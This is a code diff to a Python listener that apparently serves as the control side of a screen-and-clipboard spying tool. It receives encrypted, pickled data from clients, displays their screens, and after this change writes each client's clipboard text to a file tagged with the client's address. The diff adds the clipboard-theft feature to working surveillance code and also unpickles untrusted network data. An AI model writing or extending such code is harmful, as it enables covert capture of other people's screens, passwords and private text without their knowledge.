@@ -28,40 +28,58 @@ def listener(ip, port):
 
     while True:
         try:
-            # Receive and accumulate packet data until we get the payload size
+            # Ensure have the payload size
             while len(data_buffer) < payload_size:
                 packet = conn.recv(4096)
                 if not packet:
-                    break
+                    raise ConnectionError("Connection closed by the client.")
                 data_buffer += packet
 
+            # Unpack the message size
             packed_msg_size = data_buffer[:payload_size]
             data_buffer = data_buffer[payload_size:]
-
             msg_size = struct.unpack("Q", packed_msg_size)[0]
 
+            # Ensure we have the entire encrypted message
             while len(data_buffer) < msg_size:
-                data_buffer += conn.recv(4096)
+                packet = conn.recv(4096)
+                if not packet:
+                    raise ConnectionError("Connection closed by the client.")
+                data_buffer += packet
 
             encrypted_data = data_buffer[:msg_size]
             data_buffer = data_buffer[msg_size:]
 
-            # Decrypt and deserialize the frame
+            # Decrypt and deserialize the data (frame and clipboard)
             decrypted_data = cipher.decrypt(encrypted_data)
-            frame = pickle.loads(decrypted_data)
+            data = pickle.loads(decrypted_data)
+
+            # Extract frame and clipboard content
+            frame = data.get("frame")
+            clipboard = data.get("clipboard", "")
 
             # Ensure frame is a valid 3D NumPy array
             if not isinstance(frame, np.ndarray) or len(frame.shape) != 3:
                 print("[!] Received an invalid frame. Not a 3D NumPy array.")
                 continue
 
-            # Display the frame
+            # Display the screen frame
             cv2.imshow(f"{addr} -> Screen", frame)
+
+            # Save clipboard content
+            with open("clipboard_data.txt", "w") as clipboard_file:
+                clip_ip = str(addr)
+                cb_text = "Client: " + clip_ip + " Data: "+clipboard
+                clipboard_file.write(cb_text)
+
             if cv2.waitKey(1) & 0xFF == ord('q'):
                 break
 
+        except ConnectionError as ce:
+            print(f"[!] Connection Error: {ce}")
+            break
         except Exception as e:
-            print(f"[!] Error processing frame: {e}")
+            print(f"[!] Error processing data: {e}")
             break
 
     cv2.destroyAllWindows()
